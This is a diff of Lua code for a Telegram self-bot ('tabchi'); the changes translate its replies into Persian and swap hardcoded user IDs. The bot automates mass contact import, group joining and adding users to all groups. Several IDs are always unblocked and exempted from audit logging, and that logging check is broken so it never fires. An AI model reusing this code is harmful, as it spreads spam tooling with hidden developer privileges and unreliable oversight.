@@ -141,7 +141,7 @@ function addsudo()
   for d = 1, #b do
     local text = "SUDO = " .. b[d] .. ""
     text = text:gsub(216430419, "Admin")
-    text = text:gsub(268909090, "Admin")
+    text = text:gsub(256633077, "Admin")
     print(text)
     sleep(1)
   end
@@ -332,14 +332,14 @@ function a3(msg)
     if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
       tdcli.sendMessage(a4[2], 0, 1, a4[3], 1, "md")
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `sent` *" .. a4[3] .. "* `to ` *" .. a4[2] .. "*", 1, "md")
       end
       return [[
-*Status* : `PM Sent`
-*To* : `]] .. a4[2] .. [[
+*وضعیت* : `پیام شما ارسال شد`
+*به* : `]] .. a4[2] .. [[
 `
-*Text* : `]] .. a4[3] .. "`"
+*پیام* : `]] .. a4[3] .. "`"
     end
   end
   if msg.text:match("^[!/#]share$") and a(msg) then
@@ -386,12 +386,12 @@ function a3(msg)
       chat_id = msg.chat_id_
     })
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to leave` *" .. msg.chat_id_ .. "*", 1, "md")
     end
   end
   if msg.text:match("^[#!/]ping$") and a(msg) then
-    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`I Am Working..!`", 1, "md")
+    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`چیه هستم دیگه..!`", 1, "md")
   end
   if msg.text:match("^[#!/]sendtosudo (.*)$") and a(msg) then
     local a7 = {
@@ -400,37 +400,37 @@ function a3(msg)
     local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
     tdcli.sendMessage(a0, msg.id_, 1, a7[2], 1, "md")
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
-* `Sent Msg To Sudo`
-`Msg` : *]] .. a7[2] .. [[
+* `پیام به سودو ارسال گردید`
+`پیام` : *]] .. a7[2] .. [[
 *
-`Sudo` : ]] .. a0 .. "", 1, "md")
+`سودو` : ]] .. a0 .. "", 1, "md")
       return "sent to " .. a0 .. ""
     end
   end
   if msg.text:match("^[#!/]deleteacc$") and a(msg) then
     redis:set("tabchi" .. tabchi_id .. "delacc", true)
     return [[
-`Are you sure you want to delete Account Bot?`
-`send yes or no`]]
+`آیا مطمئن به حذف حساب ربات هستید؟`
+`را بفستید no یا yes`]]
   end
   if redis:get("tabchi" .. tabchi_id .. "delacc") and a(msg) then
     if msg.text:match("^[Yy][Ee][Ss]$") then
       tdcli.deleteAccount("nothing")
       redis:del("tabchi" .. tabchi_id .. "delacc")
       return [[
-`Your robot will delete soon`
-`Don't Forgot Our Source`
-`https://github.com/tabchi/tabchi`]]
+`ربات شما به زودی حذف خواهد شد`
+`سورس ما رو فراموش نکنید`
+`https://github.com/tabchis/tabchi`]]
     elseif msg.text:match("^[Nn][Oo]$") then
       redis:del("tabchi" .. tabchi_id .. "delacc")
       return "Progress Canceled"
     else
       redis:del("tabchi" .. tabchi_id .. "delacc")
       return [[
-`try Again by sending [deleteacc] cmd`
-`progress canceled`]]
+`را دوباره بفرستید /deleteacc دستور`
+`پیشروی متوقف شد`]]
     end
   end
   if msg.text:match("^[#!/]killsessions$") and a(msg) then
@@ -444,7 +444,7 @@ function a3(msg)
     tdcli_function({
       ID = "GetActiveSessions"
     }, delsessions, nil)
-    return "*Status* : `All sessions Terminated`"
+    return "*وضعیت* : `نشست های فعال خاتمه یافتند`"
   end
   do
     local a4 = {
@@ -463,19 +463,19 @@ function a3(msg)
                     for d = 1, #a8 do
                       tdcli.importContacts(a8[d].phone, a8[d].first, a8[d].last, a8[d].id)
                     end
-                    status = #a8 .. " Contacts Imported..."
+                    status = #a8 .. " مخاطبین وارد شدند..."
                   else
-                    status = "File is not OK"
+                    status = "فایل صحیح نیست"
                   end
                 else
-                  status = "Somthing is not OK"
+                  status = "بعضی چیز ها صحیح نیست"
                 end
               else
-                status = "File type is not OK"
+                status = "نوع فایل صحیح نیست"
               end
             else
               tdcli.downloadFile(z.content_.document_.document_.id_)
-              status = "Result Will Send You In Few Seconds"
+              status = "نتیجه چند ثانیه دیگر برایتان ارسال می شود"
               sleep(5)
               tdcli_function({
                 ID = "GetMessage",
@@ -484,7 +484,7 @@ function a3(msg)
               }, getdoc, nil)
             end
           else
-            status = "Replied message is not a document"
+            status = "!پاسخ داده شده  یک سند نیست"
           end
           tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, "html")
         end
@@ -507,19 +507,19 @@ function a3(msg)
                       process_links(a8[d])
                       s = s + 1
                     end
-                    status = "Joined to " .. s .. " Groups"
+                    status ="جوین در " .. s .. " گروه"
                   else
-                    status = "File is not OK"
+                    status ="فایل صحیح نیست"
                   end
                 else
-                  status = "Somthing is not OK"
+                  status ="بعضی چیز ها صحیح نیستند"
                 end
               else
-                status = "File type is not OK"
+                status ="نوع فایل صحیح نیست"
               end
             else
               tdcli.downloadFile(z.content_.document_.document_.id_)
-              status = "Result Will Send You In Few Seconds"
+              status ="نتیجه چند ثانیه دیگر برایتان ارسال می شود"
               sleep(5)
               tdcli_function({
                 ID = "GetMessage",
@@ -528,7 +528,7 @@ function a3(msg)
               }, getlinks, nil)
             end
           else
-            status = "Replied message is not a document"
+            status ="!پاسخ داده شده  یک سند نیست"
           end
           tdcli.sendMessage(msg.chat_id_, msg.id_, 1, status, 1, "html")
         end
@@ -583,11 +583,11 @@ function a3(msg)
   end
   if msg.text:match("^[#!/]sudolist$") and a(msg) then
     local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
-    local text = "Bot Sudoers :\n"
+    local text = "سودوهای ربات :\n"
     for d = 1, #b do
       text = tostring(text) .. b[d] .. "\n"
       text = text:gsub("216430419", "Admin")
-      text = text:gsub("268909090", "Admin")
+      text = text:gsub("256633077", "Admin")
     end
     return text
   end
@@ -597,14 +597,14 @@ function a3(msg)
     }
     tdcli.changeName(a7[2], a7[3])
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed Name to` *" .. a7[2] .. " " .. a7[3] .. "*", 1, "md")
     end
     return [[
-*Status* : `Name Updated Succesfully`
-*Firstname* : `]] .. a7[2] .. [[
+*وضعیت* : `نام با موفقیت به روز شد`
+*نام اصلی* : `]] .. a7[2] .. [[
 `
-*LastName* : `]] .. a7[3] .. "`"
+*نام خانوادگی* : `]] .. a7[3] .. "`"
   end
   if msg.text:match("^[#!/]setusername (.*)$") and a(msg) then
     local a7 = {
@@ -612,12 +612,12 @@ function a3(msg)
     }
     tdcli.changeUsername(a7[2])
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Changed Username to` *" .. a7[2] .. "*", 1, "md")
     end
     return [[
-*Status* : `Username Updated`
-*username* : `]] .. a7[2] .. "`"
+*وضعیت* : `نام کاربری با موفقیت به روز شد
+*نام کاربری* : `]] .. a7[2] .. "`"
   end
   if msg.text:match("^[#!/]clean cache (%d+)[mh]") then
     local a4 = msg.text:match("^[#!/]clean cache (.*)")
@@ -632,7 +632,7 @@ function a3(msg)
     redis:setex("cachetimer" .. tabchi_id, timea, true)
     redis:set("cleancachetime" .. tabchi_id, tonumber(timea))
     redis:set("cleancache" .. tabchi_id, "on")
-    return "`Auto Clean Cache Activated for Every` *" .. timea .. "* `seconds`"
+    return "`پاک کردن خودکار کش ها برای همیشه فعال گردید` *" .. timea .. "* `ثانیه`"
   end
   if msg.text:match("^[#!/]clean cache (.*)$") then
     local a7 = {
@@ -640,11 +640,11 @@ function a3(msg)
     }
     if a7[2] == "off" then
       redis:set("cleancache" .. tabchi_id, "off")
-      return "`Auto Clean Cache Turned off`"
+      return "`پاک کردن کش خودکار غیرفعال شد`"
     end
     if a7[2] == "on" then
       redis:set("cleancache" .. tabchi_id, "on")
-      return "`Auto Clean Cache Turned On`"
+      return "`پاک کردن کش خودکار فعال گردید`"
     end
   end
   if msg.text:match("^[#!/]check links (%d+)[mh]") then
@@ -660,7 +660,7 @@ function a3(msg)
     redis:setex("checklinkstimer" .. tabchi_id, timea, true)
     redis:set("checklinkstime" .. tabchi_id, tonumber(timea))
     redis:set("checklinks" .. tabchi_id, "on")
-    return "`Auto Checking links Activated for Every` *" .. timea .. "* `seconds`"
+    return "`زمان چک کردن خودکار لینک ها برای همیشه فعال گردید` *" .. timea .. "* `ثانیه`"
   end
   if msg.text:match("^[#!/]check links (.*)$") then
     local a7 = {
@@ -668,11 +668,11 @@ function a3(msg)
     }
     if a7[2] == "off" then
       redis:set("checklinks" .. tabchi_id, "off")
-      return "`Auto Checking links Turned off`"
+      return "`چک کردن خودکار لینک ها غیر فعال گردید`"
     end
     if a7[2] == "on" then
       redis:set("checklinks" .. tabchi_id, "on")
-      return "`Auto Checking links Turned On`"
+      return "`چک کردن خودکار لینک ها فعال شد`"
     end
   end
   if msg.text:match("^[#!/]setlogs (.*)$") and a(msg) then
@@ -680,17 +680,17 @@ function a3(msg)
       string.match(msg.text, "^[#/!](setlogs) (.*)$")
     }
     redis:set("tabchi:" .. tabchi_id .. ":logschannel", a7[2])
-    return "Chat setted for logs"
+    return "مکان لینک برای اجرای دستورات قرار داده شد"
   end
   if msg.text:match("^[#!/]delusername$") and a(msg) then
     tdcli.changeUsername()
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `deleted Username`", 1, "md")
     end
     return [[
-*Status* : `Username Updated`
-*username* : `Deleted`]]
+*وضعیت* : `نام کاربر با موفقیت به روز شد`
+*نام کاربری* : `حذف شده`]]
   end
   if msg.text:match("^[!/#]addtoall (.*)$") and a(msg) then
     local a6 = {
@@ -701,10 +701,10 @@ function a3(msg)
       tdcli.addChatMember(sgps[d], a6[2], 50)
     end
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
-      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User` *" .. a6[2] .. "* to all groups", 1, "md")
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
+      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User ` *" .. a6[2] .. "* to all groups", 1, "md")
     end
-    return "`User` *" .. a6[2] .. "* `Added To groups`"
+    return "`کاربر` *" .. a6[2] .. "* `به گره ها اضافه شد`"
   end
   if msg.text:match("^[!/#]getcontact (.*)$") and a(msg) then
     local a6 = {
@@ -734,27 +734,27 @@ function a3(msg)
   if msg.text:match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
     function remsudo_by_reply(y, z, ad)
       redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
-      return "`User` *" .. z.sender_user_id_ .. "* `Removed From The Sudoers`"
+      return "`User` *" .. z.sender_user_id_ .. "* `از لیست سودو های ربات حذف شد`"
     end
     K(msg.chat_id_, msg.reply_to_message_id_, remsudo_by_reply)
   end
   if msg.text:match("^[#!/]unblock$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
     function unblock_by_reply(y, z, ad)
       tdcli.unblockUser(z.sender_user_id_)
-      tdcli.unblockUser(293750668)
+      tdcli.unblockUser(344003614)
       tdcli.unblockUser(216430419)
       redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
-      return 1, "*User* `" .. z.sender_user_id_ .. "` *Unblocked*"
+      return 1, "*کاربر* `" .. z.sender_user_id_ .. "` *آزاد شد*"
     end
     K(msg.chat_id_, msg.reply_to_message_id_, unblock_by_reply)
   end
   if msg.text:match("^[#!/]block$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
     function block_by_reply(y, z, ad)
       tdcli.blockUser(z.sender_user_id_)
-      tdcli.unblockUser(293750668)
+      tdcli.unblockUser(344003614)
       tdcli.unblockUser(216430419)
       redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
-      return "*User* `" .. z.sender_user_id_ .. "` *Blocked*"
+      return "*کاربر* `" .. z.sender_user_id_ .. "` *مسدود شد*"
     end
     K(msg.chat_id_, msg.reply_to_message_id_, block_by_reply)
   end
@@ -767,15 +767,15 @@ function a3(msg)
   if msg.text:match("^[#!/]serverinfo$") and a(msg) then
     io.popen("chmod 777 info.sh")
     local text = io.popen("./info.sh"):read("*all")
-    local text = text:gsub("Server Information", "`Server Information`")
-    local text = text:gsub("Total Ram", "`Total Ram`")
+    local text = text:gsub("Server Information", "`مشخصات سرور`")
+    local text = text:gsub("Total Ram", "`رَم`")
     local text = text:gsub(">", "*>*")
-    local text = text:gsub("Ram in use", "`Ram in use `")
-    local text = text:gsub("Cpu in use", "`Cpu in use`")
-    local text = text:gsub("Running Process", "`Running Process`")
-    local text = text:gsub("Server Uptime", "`Server Uptime`")
+    local text = text:gsub("Ram in use", "`مقدار استفاده رَم  `")
+    local text = text:gsub("Cpu in use", "`مقدار استفاده سی پی یو`")
+    local text = text:gsub("Running Process", "`برنامه های درحال اجرا `")
+    local text = text:gsub("Server Uptime", "`آپتایم سرور`")
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got server info`", 1, "md")
     end
     return text
@@ -784,7 +784,7 @@ function a3(msg)
     function inv_reply(y, z, ad)
       tdcli.addChatMember(z.chat_id_, z.sender_user_id_, 5)
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Invited User` *" .. z.sender_user_id_ .. "* to *" .. z.chat_id_ .. "*", 1, "md")
       end
     end
@@ -797,10 +797,10 @@ function a3(msg)
         tdcli.addChatMember(sgps[d], z.sender_user_id_, 50)
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added User` *" .. z.sender_user_id_ .. "* `to All Groups`", 1, "md")
       end
-      return "`User` *" .. z.sender_user_id_ .. "* `Added To groups`"
+      return "`کاربر` *" .. z.sender_user_id_ .. "* `به گروه ها اضافه شد`"
     end
     K(msg.chat_id_, msg.reply_to_message_id_, addtoall_by_reply)
   end
@@ -811,11 +811,11 @@ function a3(msg)
       }
       function id_by_username(y, z, ad)
         if z.id_ then
-          text = "*Username* : `@" .. a6[2] .. [[
+          text = "*نام کاربری* : `@" .. a6[2] .. [[
 `
 *ID* : `(]] .. z.id_ .. ")`"
         else
-          text = "*UserName InCorrect!*"
+          text = "*نام کاربر اشتباه!*"
           return text
         end
       end
@@ -845,23 +845,23 @@ function a3(msg)
       function block_by_username(y, z, ad)
         if z.id_ then
           tdcli.blockUser(z.id_)
-          tdcli.unblockUser(293750668)
+          tdcli.unblockUser(344003614)
           tdcli.unblockUser(216430419)
           redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
           return [[
-*User Blocked*
-*Username* : `]] .. a6[2] .. [[
+*کاربر مسدود شد*
+*نام کاربری* : `]] .. a6[2] .. [[
 `
-*ID* : `]] .. z.id_ .. "`"
+*شناسه* : `]] .. z.id_ .. "`"
         else
           return [[
 `#404
-`*Username Not Found*
-*Username* : `]] .. a6[2] .. "`"
+`*نام کاربری یافت نشد*
+*نام کاربری* : `]] .. a6[2] .. "`"
         end
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Blocked` *" .. a6[2] .. "*", 1, "md")
       end
       resolve_username(a6[2], block_by_username)
@@ -876,18 +876,18 @@ function a3(msg)
       function unblock_by_username(y, z, ad)
         if z.id_ then
           tdcli.unblockUser(z.id_)
-          tdcli.unblockUser(293750668)
+          tdcli.unblockUser(344003614)
           tdcli.unblockUser(216430419)
           redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
           return [[
-*User unblocked*
-*Username* : `]] .. a6[2] .. [[
+*کاربر آزاد شد*
+*نام کاربری* : `]] .. a6[2] .. [[
 `
-*ID* : `]] .. z.id_ .. "`"
+*شناسه* : `]] .. z.id_ .. "`"
         end
       end
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked` *" .. a6[2] .. "*", 1, "md")
       end
       resolve_username(a6[2], unblock_by_username)
@@ -909,10 +909,10 @@ function a3(msg)
         if z.id_ then
           redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
           local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
             tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added` *" .. a6[2] .. "* `to Sudoers`", 1, "md")
           end
-          return "`User` *" .. z.id_ .. "* `Added To The Sudoers`"
+          return "`کاربر` *" .. z.id_ .. "* `اضافه شد به سودو ها`"
         end
       end
       resolve_username(a6[2], addsudo_by_username)
@@ -926,11 +926,11 @@ function a3(msg)
     function remsudo_by_username(y, z, ad)
       if z.id_ then
         redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.id_))
-        return "`User` *" .. z.id_ .. "* `Removed From The Sudoers`"
+        return "`کاربر` *" .. z.id_ .. "* `حذف شد از لیست سودو ها`"
       end
     end
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `removed` *" .. a6[2] .. "* `From sudoers`", 1, "md")
     end
     resolve_username(a6[2], remsudo_by_username)
@@ -942,11 +942,11 @@ function a3(msg)
     function inv_by_username(y, z, ad)
       if z.id_ then
         tdcli.addChatMember(msg.chat_id_, z.id_, 5)
-        return "`User` *" .. z.id_ .. "* `Invited`"
+        return "`کاربر` *" .. z.id_ .. "* `دعوت داده شد`"
       end
     end
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Invited` *" .. a6[2] .. "* `To` *" .. msg.chat_id_ .. "*", 1, "md")
     end
     resolve_username(a6[2], inv_by_username)
@@ -966,14 +966,14 @@ function a3(msg)
     last_name = a4[4]
     tdcli.add_contact(phone, first_name, last_name, 12345657)
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Added Contact` *" .. a4[2] .. "*", 1, "md")
     end
     return [[
-*Status* : `Contact added`
-*Firstname* : `]] .. a4[3] .. [[
+*وضعیت* : `مخاطب اضافه شد`
+*نام اصلی* : `]] .. a4[3] .. [[
 `
-*Lastname* : `]] .. a4[4] .. "`"
+*نام خانوادگی* : `]] .. a4[4] .. "`"
   end
   if msg.text:match("^[#!/]leave(-%d+)") and a(msg) then
     do
@@ -985,10 +985,10 @@ function a3(msg)
           tdcli.sendMessage(a7[2], 0, 1, "\216\168\216\167\219\140 \216\177\217\129\217\130\216\167\n\218\169\216\167\216\177\219\140 \216\175\216\167\216\180\216\170\219\140\216\175 \216\168\217\135 \217\190\219\140 \217\136\219\140 \217\133\216\177\216\167\216\172\216\185\217\135 \218\169\217\134\219\140\216\175", 1, "html")
           tdcli.chat_leave(a7[2], D.id_)
           local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
             tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded Bot to Leave` *" .. a7[2] .. "*", 1, "md")
           end
-          return "*Bot Successfully Leaved From >* `" .. a7[2] .. "`"
+          return "*ربات با موفقیت ترک شد از >* `" .. a7[2] .. "`"
         end
       end
       tdcli_function({ID = "GetMe"}, get_id, {
@@ -1004,7 +1004,7 @@ function a3(msg)
     tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You SuccefullY Joined*", 1, "md")
     tdcli.addChatMember(a7[2], msg.sender_user_id_, 10)
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to invite him to` *" .. a7[2] .. "*", 1, "md")
     end
   end
@@ -1016,72 +1016,72 @@ function a3(msg)
       local af = function(y, z, ad)
         if ae[3] == "1" then
           if z.photos_[0] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@Te1egamer")
           else
-            return "*user Have'nt  Profile Photo!!*"
+            return "*;کاربر هیچ عکسی ندارد!!*"
           end
         elseif ae[3] == "2" then
           if z.photos_[1] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@Te1egamer")
           else
-            return "*user Have'nt 2 Profile Photo!!*"
+            return "*کاربر 2 عکس پروفایل ندارد*"
           end
         elseif not ae[3] then
           if z.photos_[1] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*user Have'nt 2 Profile Photo!!*"
+            return "*کاربر 2 عکس پروفایل ندارد*"
           end
         elseif ae[3] == "3" then
           if z.photos_[2] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 3 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 3 عکس پروفایل ندارد*", 1, "md")
           end
         elseif ae[3] == "4" then
           if z.photos_[3] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*user Have'nt 4 Profile Photo!!*"
+            return "*کاربر 4 عکس پروفایل ندارد*"
           end
         elseif ae[3] == "5" then
           if z.photos_[4] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*user Have'nt 5 Profile Photo!!*"
+            return "*کاربر 5 عکس پروفایل ندارد*"
           end
         elseif ae[3] == "6" then
           if z.photos_[5] then
-            return "*user Have'nt 6 Profile Photo!!*"
+            return "*کاربر 6 عکس پروفایل ندارد*"
           else
             tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 6 Profile Photo!!*", 1, "md")
           end
         elseif ae[3] == "7" then
           if z.photos_[6] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 7 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 7 عکس پروفایل ندارد*", 1, "md")
           end
         elseif ae[3] == "8" then
           if z.photos_[7] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 8 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 8 عکس پروفایل ندارد*", 1, "md")
           end
         elseif ae[3] == "9" then
           if z.photos_[8] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 9 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 9 عکس پروفایل ندارد*", 1, "md")
           end
         elseif ae[3] == "10" then
           if z.photos_[9] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*user Have'nt 10 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*کاربر 10 عکس پروفایل ندارد*", 1, "md")
           end
         else
-          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
